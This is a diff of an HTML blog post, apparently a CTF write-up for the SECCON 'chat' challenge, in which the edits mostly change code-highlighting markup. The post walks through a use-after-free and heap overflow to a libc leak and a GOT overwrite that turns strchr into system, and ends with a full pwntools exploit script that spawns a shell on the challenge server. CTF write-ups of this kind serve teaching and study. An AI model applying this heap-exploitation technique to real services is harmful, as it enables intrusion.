@@ -307,7 +307,7 @@
 <p>64 bit ELF with Partial RELRO, stack canary &amp; NX enabled, No PIE.</p>
 
 <p>The program is a simple tweet-chat service:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./chat
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./chat
 Simple Chat Service
 
 1 : Sign Up     2 : Sign In
@@ -341,8 +341,8 @@ message &gt;&gt; from a
 Done.
 </code></pre></div></div>
 
-<p>As we can see the service allow us to sign up users, sign in and tweet message (send public message). We can also DM other users. In the above example, after <code class="highlighter-rouge">userA</code> send a message to <code class="highlighter-rouge">userB</code>, we can sign in as <code class="highlighter-rouge">userB</code> and check the DM:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
+<p>As we can see the service allow us to sign up users, sign in and tweet message (send public message). We can also DM other users. In the above example, after <code class="language-plaintext highlighter-rouge">userA</code> send a message to <code class="language-plaintext highlighter-rouge">userB</code>, we can sign in as <code class="language-plaintext highlighter-rouge">userB</code> and check the DM:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
 0 : Exit
 menu &gt; 2
 name &gt; userB
@@ -370,18 +370,18 @@ Done.
 <span class="p">}</span>
 
 <span class="k">struct</span> <span class="n">message</span> <span class="p">{</span>
-    <span class="kt">int</span> <span class="n">id</span> <span class="p">;</span> <span class="c1">// use in tweet (public message) only
-</span>    <span class="k">struct</span> <span class="n">user</span> <span class="o">*</span><span class="n">sender</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">id</span> <span class="p">;</span> <span class="c1">// use in tweet (public message) only</span>
+    <span class="k">struct</span> <span class="n">user</span> <span class="o">*</span><span class="n">sender</span><span class="p">;</span>
     <span class="kt">char</span> <span class="n">content</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
     <span class="k">struct</span> <span class="n">message</span> <span class="o">*</span><span class="n">next_msg</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>Notice that there’s some limitations while setting <code class="highlighter-rouge">user-&gt;name</code>: the maximum name length is 32, and <strong>the first character must be a printable character</strong> (check by the <a href="http://www.cplusplus.com/reference/cctype/isprint/">isprint</a> function). This effects the functionality of the <code class="highlighter-rouge">Change UserName</code> : If you change a user’s name, and the new name isn’t a valid user name, <strong>it will remove the user</strong>.</p>
+<p>Notice that there’s some limitations while setting <code class="language-plaintext highlighter-rouge">user-&gt;name</code>: the maximum name length is 32, and <strong>the first character must be a printable character</strong> (check by the <a href="http://www.cplusplus.com/reference/cctype/isprint/">isprint</a> function). This effects the functionality of the <code class="language-plaintext highlighter-rouge">Change UserName</code> : If you change a user’s name, and the new name isn’t a valid user name, <strong>it will remove the user</strong>.</p>
 
 <p>So what if we remove a user after we send a DM to another user?</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 : Sign Up     2 : Sign In
 0 : Exit
 menu &gt; 2
 name &gt; userA
@@ -418,10 +418,10 @@ Direct Messages
 Done.
 </code></pre></div></div>
 
-<p>We can see that if we show <code class="highlighter-rouge">userB</code>’s DM after we remove <code class="highlighter-rouge">userA</code>, the sender’s name will become a strange value. This is because while removing <code class="highlighter-rouge">userA</code>, it will free the <code class="highlighter-rouge">userA-&gt;name</code> pointer, but the program is still able to access the pointer by showing <code class="highlighter-rouge">userB</code>’s DM <strong>( accessing <code class="highlighter-rouge">userB-&gt;messsage-&gt;sender-&gt;name</code> )</strong>. A typical Use-After-Free vulnerability.</p>
+<p>We can see that if we show <code class="language-plaintext highlighter-rouge">userB</code>’s DM after we remove <code class="language-plaintext highlighter-rouge">userA</code>, the sender’s name will become a strange value. This is because while removing <code class="language-plaintext highlighter-rouge">userA</code>, it will free the <code class="language-plaintext highlighter-rouge">userA-&gt;name</code> pointer, but the program is still able to access the pointer by showing <code class="language-plaintext highlighter-rouge">userB</code>’s DM <strong>( accessing <code class="language-plaintext highlighter-rouge">userB-&gt;messsage-&gt;sender-&gt;name</code> )</strong>. A typical Use-After-Free vulnerability.</p>
 
-<p>So now there’s a dangling pointer in the program. If we can arrange the heap memory chunk carefully, and make a user’s name buffer overlapped with <code class="highlighter-rouge">userB-&gt;messsage-&gt;sender</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<p>So now there’s a dangling pointer in the program. If we can arrange the heap memory chunk carefully, and make a user’s name buffer overlapped with <code class="language-plaintext highlighter-rouge">userB-&gt;messsage-&gt;sender</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
                        +--------------+
 userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
                        |              |
@@ -437,10 +437,10 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
                        +-----------+
 
 </code></pre></div></div>
-<p>We can then modify the value of pointer <code class="highlighter-rouge">p_name</code> by editing <code class="highlighter-rouge">userC-&gt;name</code>, and then leak some address by viewing <code class="highlighter-rouge">userB</code>’s DM ( sender’s name ). This can be done easily if you’re familiar with the glibc malloc’s fastbin allocation. By changing <code class="highlighter-rouge">p_name</code> into <code class="highlighter-rouge">__libc_start_main@got.plt</code> ( <code class="highlighter-rouge">0x603040</code>, which its first character is <code class="highlighter-rouge">0x40</code>, a printable character ), we can then leak the libc’s base address.</p>
+<p>We can then modify the value of pointer <code class="language-plaintext highlighter-rouge">p_name</code> by editing <code class="language-plaintext highlighter-rouge">userC-&gt;name</code>, and then leak some address by viewing <code class="language-plaintext highlighter-rouge">userB</code>’s DM ( sender’s name ). This can be done easily if you’re familiar with the glibc malloc’s fastbin allocation. By changing <code class="language-plaintext highlighter-rouge">p_name</code> into <code class="language-plaintext highlighter-rouge">__libc_start_main@got.plt</code> ( <code class="language-plaintext highlighter-rouge">0x603040</code>, which its first character is <code class="language-plaintext highlighter-rouge">0x40</code>, a printable character ), we can then leak the libc’s base address.</p>
 
 <p>Now we still need to find a way to do the “write-anywhere” attack. It’s kind of hard to find such vulnerability by just reversing the binary, so I decided to start fuzzing the binary, while examine the heap memory at the same time. Finally ( and luckily ! ), I notice that I’ve made the heap memory chunk arranged like this:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
           +--------------+
 0x1234050 |              | userC-&gt;name
           +--------------+
@@ -463,20 +463,20 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 
 </code></pre></div></div>
 
-<p>I found that I can corrupt the header of unsortbin chunk <code class="highlighter-rouge">0x1234060</code> by overflowing the <code class="highlighter-rouge">userC-&gt;name</code> buffer ! Later I realized that this is because program use <code class="highlighter-rouge">strdup</code> to allocate the buffer of <code class="highlighter-rouge">userC-&gt;name</code>. If we set the name length of <code class="highlighter-rouge">userC</code> less than 24, it will allocate a buffer with size <code class="highlighter-rouge">0x20</code> ( fastbin[0] ) . But when we change a user’s name, it allow us to input at most 32 characters, which will overflow the name buffer !</p>
+<p>I found that I can corrupt the header of unsortbin chunk <code class="language-plaintext highlighter-rouge">0x1234060</code> by overflowing the <code class="language-plaintext highlighter-rouge">userC-&gt;name</code> buffer ! Later I realized that this is because program use <code class="language-plaintext highlighter-rouge">strdup</code> to allocate the buffer of <code class="language-plaintext highlighter-rouge">userC-&gt;name</code>. If we set the name length of <code class="language-plaintext highlighter-rouge">userC</code> less than 24, it will allocate a buffer with size <code class="language-plaintext highlighter-rouge">0x20</code> ( fastbin[0] ) . But when we change a user’s name, it allow us to input at most 32 characters, which will overflow the name buffer !</p>
 
-<p>By corrupting the meta data and change the chunk size from <code class="highlighter-rouge">0x21</code> to <code class="highlighter-rouge">0xa1</code> ( the size of a <code class="highlighter-rouge">message</code> structure ), we can allocate a fake chunk (<code class="highlighter-rouge">0x1234060</code>, size = <code class="highlighter-rouge">0xa1</code>), and forge the data structure at <code class="highlighter-rouge">0x1234090</code> ( a <code class="highlighter-rouge">user</code> structure ), change the <code class="highlighter-rouge">userC-&gt;name</code> pointer from <code class="highlighter-rouge">0x1234050</code> into another memory address, then we can do the “write-anywhere” attack ( ex. GOT hijacking ) by changing <code class="highlighter-rouge">userC</code>’s name .</p>
+<p>By corrupting the meta data and change the chunk size from <code class="language-plaintext highlighter-rouge">0x21</code> to <code class="language-plaintext highlighter-rouge">0xa1</code> ( the size of a <code class="language-plaintext highlighter-rouge">message</code> structure ), we can allocate a fake chunk (<code class="language-plaintext highlighter-rouge">0x1234060</code>, size = <code class="language-plaintext highlighter-rouge">0xa1</code>), and forge the data structure at <code class="language-plaintext highlighter-rouge">0x1234090</code> ( a <code class="language-plaintext highlighter-rouge">user</code> structure ), change the <code class="language-plaintext highlighter-rouge">userC-&gt;name</code> pointer from <code class="language-plaintext highlighter-rouge">0x1234050</code> into another memory address, then we can do the “write-anywhere” attack ( ex. GOT hijacking ) by changing <code class="language-plaintext highlighter-rouge">userC</code>’s name .</p>
 
 <p>So to sum up:</p>
 <ol>
-  <li>Overflow <code class="highlighter-rouge">userC-&gt;name</code>, change the unsortbin chunk size into <code class="highlighter-rouge">0xa1</code>.</li>
+  <li>Overflow <code class="language-plaintext highlighter-rouge">userC-&gt;name</code>, change the unsortbin chunk size into <code class="language-plaintext highlighter-rouge">0xa1</code>.</li>
   <li>Post a tweet, this will allocate the memory from unsortbin.</li>
-  <li>Craft the tweet message, forge a fake <code class="highlighter-rouge">user</code> structure (modify the <code class="highlighter-rouge">userC-&gt;name</code> pointer).</li>
-  <li>Change the name of <code class="highlighter-rouge">userC</code> to overwrite the memory.</li>
+  <li>Craft the tweet message, forge a fake <code class="language-plaintext highlighter-rouge">user</code> structure (modify the <code class="language-plaintext highlighter-rouge">userC-&gt;name</code> pointer).</li>
+  <li>Change the name of <code class="language-plaintext highlighter-rouge">userC</code> to overwrite the memory.</li>
 </ol>
 
-<p>Looks simple huh? Except it’s <strong>not</strong>. To successfully change a user name, <strong>both the old user name and the new user name’s first character has to be printable</strong>. For example, if we want to hijack <code class="highlighter-rouge">free</code>’s GOT:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x603010
+<p>Looks simple huh? Except it’s <strong>not</strong>. To successfully change a user name, <strong>both the old user name and the new user name’s first character has to be printable</strong>. For example, if we want to hijack <code class="language-plaintext highlighter-rouge">free</code>’s GOT:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x603010
 00:0000|  0x603010 --&gt; 0x7eff900f44a0 (&lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38)
 01:0008|  0x603018 --&gt; 0x7eff8fd9bd00 (&lt;__GI___libc_free&gt;:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)
 02:0016|  0x603020 --&gt; 0x7eff8fda19b0 (&lt;strlen&gt;:        pxor   xmm8,xmm8)
@@ -486,10 +486,10 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 06:0048|  0x603040 --&gt; 0x7eff8fd3ae50 (&lt;__libc_start_main&gt;:     push   r14)
 07:0056|  0x603048 --&gt; 0x7eff8fd87160 (&lt;_IO_fgets&gt;:     push   r12)
 </code></pre></div></div>
-<p>We can see that <code class="highlighter-rouge">free</code>’s GOT ( <code class="highlighter-rouge">0x603018</code> ) stores the address <code class="highlighter-rouge">0x7eff8fd9bd00</code>. Its first character is <code class="highlighter-rouge">0x00</code>, which is not printable, making us unable to change the content of <code class="highlighter-rouge">0x603018</code>. Even if its first character is printable, the <code class="highlighter-rouge">system</code>’s offset in the libc is <code class="highlighter-rouge">0x46590</code> – another non-printable first character, which will make the program remove (freeing) the user name and crash the program ( for trying to free a GOT entry ).</p>
+<p>We can see that <code class="language-plaintext highlighter-rouge">free</code>’s GOT ( <code class="language-plaintext highlighter-rouge">0x603018</code> ) stores the address <code class="language-plaintext highlighter-rouge">0x7eff8fd9bd00</code>. Its first character is <code class="language-plaintext highlighter-rouge">0x00</code>, which is not printable, making us unable to change the content of <code class="language-plaintext highlighter-rouge">0x603018</code>. Even if its first character is printable, the <code class="language-plaintext highlighter-rouge">system</code>’s offset in the libc is <code class="language-plaintext highlighter-rouge">0x46590</code> – another non-printable first character, which will make the program remove (freeing) the user name and crash the program ( for trying to free a GOT entry ).</p>
 
-<p>So how are we gonna bypass the check? Well it’s a little bit tricky, but also very interesting. I notice that the GOT entry of <code class="highlighter-rouge">stack_chk_fail</code> stores the address <code class="highlighter-rouge">0x4007f6</code>. Although <code class="highlighter-rouge">0xf6</code> is non-printable, the third character <code class="highlighter-rouge">0x40</code> is a printable character. Hmmmm, if only I can make <code class="highlighter-rouge">0x40</code> to our user name’s first character…</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x60302a
+<p>So how are we gonna bypass the check? Well it’s a little bit tricky, but also very interesting. I notice that the GOT entry of <code class="language-plaintext highlighter-rouge">stack_chk_fail</code> stores the address <code class="language-plaintext highlighter-rouge">0x4007f6</code>. Although <code class="language-plaintext highlighter-rouge">0xf6</code> is non-printable, the third character <code class="language-plaintext highlighter-rouge">0x40</code> is a printable character. Hmmmm, if only I can make <code class="language-plaintext highlighter-rouge">0x40</code> to our user name’s first character…</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ tel 0x60302a
 00:0000|  0x60302a --&gt; 0xb100000000000040   &lt;-- printable first character !
 01:0008|  0x603032 --&gt; 0xfd4000007eff8fd8 
 02:0016|  0x60303a --&gt; 0xae5000007eff8fd9 
@@ -500,11 +500,11 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 07:0056|  0x603062 --&gt; 0x8e80000000000040
 </code></pre></div></div>
 
-<p>That’s right ! If we change the <code class="highlighter-rouge">userC-&gt;name</code> pointer into <code class="highlighter-rouge">0x60302a</code>, we can start overwriting the content from <code class="highlighter-rouge">0x60302a</code>. We first filled the GOT entry of <code class="highlighter-rouge">stack_chk_fail</code> with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT !</p>
+<p>That’s right ! If we change the <code class="language-plaintext highlighter-rouge">userC-&gt;name</code> pointer into <code class="language-plaintext highlighter-rouge">0x60302a</code>, we can start overwriting the content from <code class="language-plaintext highlighter-rouge">0x60302a</code>. We first filled the GOT entry of <code class="language-plaintext highlighter-rouge">stack_chk_fail</code> with some printable characters ( now the first character of new user name is printable ! ), then we can start hijack some GOT !</p>
 
-<p>Here I decided to hijack <code class="highlighter-rouge">strchr</code>’s GOT so when the program call <code class="highlighter-rouge">strchr(buf, 10)</code> ( <code class="highlighter-rouge">buf</code> stores our input ) it will call <code class="highlighter-rouge">system(buf)</code> instead.</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<p>Here I decided to hijack <code class="language-plaintext highlighter-rouge">strchr</code>’s GOT so when the program call <code class="language-plaintext highlighter-rouge">strchr(buf, 10)</code> ( <code class="language-plaintext highlighter-rouge">buf</code> stores our input ) it will call <code class="language-plaintext highlighter-rouge">system(buf)</code> instead.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -513,15 +513,15 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"chat.pwn.seccon.jp"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">26895</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./chat"</span>
-<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span> <span class="c"># ubuntu 14.04 64bit</span>
-
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span> <span class="c1"># ubuntu 14.04 64bit
+</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
@@ -565,20 +565,20 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    
-    <span class="n">signup</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fastbin[0] * 2</span>
-    <span class="n">signup</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c"># fastbin[0] * 2</span>
-    <span class="n">signup</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span> <span class="c"># fastbin[0] * 1 + fastbin[1] * 1 </span>
-
+    <span class="c1">#r = process(ELF_PATH)
+</span>    
+    <span class="n">signup</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># fastbin[0] * 2
+</span>    <span class="n">signup</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># fastbin[0] * 2
+</span>    <span class="n">signup</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span> <span class="c1"># fastbin[0] * 1 + fastbin[1] * 1 
+</span>
     <span class="n">signin</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
     <span class="n">tweet</span><span class="p">(</span><span class="s">"aaaa"</span><span class="p">)</span> 
     <span class="n">signout</span><span class="p">()</span>
 
     <span class="n">signin</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
     <span class="n">tweet</span><span class="p">(</span><span class="s">"bbbb"</span><span class="p">)</span>
-    <span class="n">dm</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="s">"BA"</span><span class="p">)</span> <span class="c"># for creating dangling pointer</span>
-    <span class="n">dm</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"BC"</span><span class="p">)</span>
+    <span class="n">dm</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="s">"BA"</span><span class="p">)</span> <span class="c1"># for creating dangling pointer
+</span>    <span class="n">dm</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"BC"</span><span class="p">)</span>
     <span class="n">signout</span><span class="p">()</span>
 
     <span class="n">signin</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
@@ -586,23 +586,23 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
     <span class="n">signout</span><span class="p">()</span>
 
     <span class="n">signin</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
-    <span class="n">change_name</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span> <span class="c"># invalid, will remove user (user AAAA's DM become dangling pointer)</span>
-    <span class="n">signin</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span> <span class="c1"># invalid, will remove user (user AAAA's DM become dangling pointer)
+</span>    <span class="n">signin</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="mi">30</span><span class="p">)</span>
     <span class="n">change_name</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span> 
 
     <span class="n">signup</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
     <span class="n">signin</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> <span class="c"># null out the address</span>
-        <span class="n">change_name</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span> <span class="c1"># null out the address
+</span>        <span class="n">change_name</span><span class="p">(</span><span class="s">"d"</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
 
     <span class="n">malusr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">])</span>
-    <span class="n">change_name</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span> <span class="c"># AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt</span>
-    <span class="n">signout</span><span class="p">()</span>
+    <span class="n">change_name</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span> <span class="c1"># AAAA's DM's sender-&gt;name will pointer to __libc_start_main@got.plt
+</span>    <span class="n">signout</span><span class="p">()</span>
 
-    <span class="c"># leak libc</span>
-    <span class="n">signin</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c"># show DM, leak libc</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"["</span><span class="p">)</span>
+    <span class="c1"># leak libc
+</span>    <span class="n">signin</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c1"># show DM, leak libc
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"["</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
     <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 
@@ -610,25 +610,25 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     <span class="n">signout</span><span class="p">()</span>
 
-    <span class="c"># somehow we can overwrite an unsortbin chunk's size</span>
-    <span class="c"># enlarge the size, so we can overflow the heap buffer and fake some data structure</span>
-    <span class="n">signin</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span>
+    <span class="c1"># somehow we can overwrite an unsortbin chunk's size
+</span>    <span class="c1"># enlarge the size, so we can overflow the heap buffer and fake some data structure
+</span>    <span class="n">signin</span><span class="p">(</span><span class="n">malusr</span><span class="p">)</span>
     <span class="n">change_name</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">))</span>
-    <span class="n">tweet</span><span class="p">(</span><span class="s">"fuck"</span><span class="p">)</span> <span class="c"># will allocate chunk from smallbin</span>
-    <span class="n">change_name</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c"># make this user into right index</span>
-    <span class="n">tweet</span><span class="p">(</span><span class="s">"7"</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x60302a</span><span class="p">))</span> <span class="c"># allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a</span>
-
-    <span class="c"># start overwriting, we wish to overwrite strchr's got</span>
-    <span class="n">change_name</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> <span class="c"># padding + padding + strchr's got (overwrite to system)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c"># strchr("sh", 10) --&gt; system("sh")</span>
-
+    <span class="n">tweet</span><span class="p">(</span><span class="s">"fuck"</span><span class="p">)</span> <span class="c1"># will allocate chunk from smallbin
+</span>    <span class="n">change_name</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c1"># make this user into right index
+</span>    <span class="n">tweet</span><span class="p">(</span><span class="s">"7"</span><span class="o">*</span><span class="mi">16</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x60302a</span><span class="p">))</span> <span class="c1"># allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a
+</span>
+    <span class="c1"># start overwriting, we wish to overwrite strchr's got
+</span>    <span class="n">change_name</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">6</span><span class="o">+</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span> <span class="c1"># padding + padding + strchr's got (overwrite to system)
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c1"># strchr("sh", 10) --&gt; system("sh")
+</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
 <p>First time solving a 500 points pwn challenge ! WOOHOO !</p>
 
-<p>flag: <code class="highlighter-rouge">SECCON{51mpl3_ch47_l1k3_7w1*73*}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">SECCON{51mpl3_ch47_l1k3_7w1*73*}</code></p>
 
         
       </section>
@@ -741,7 +741,6 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -761,7 +760,6 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 
         
           
-          
 
 
 
@@ -780,7 +778,6 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 </div>
 
         
-          
           
 
 
@@ -803,7 +800,6 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
 
         
           
-          
 
 
 
@@ -824,6 +820,7 @@ userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name
         
       </div>
     </div>
+  
   
 </div>
 
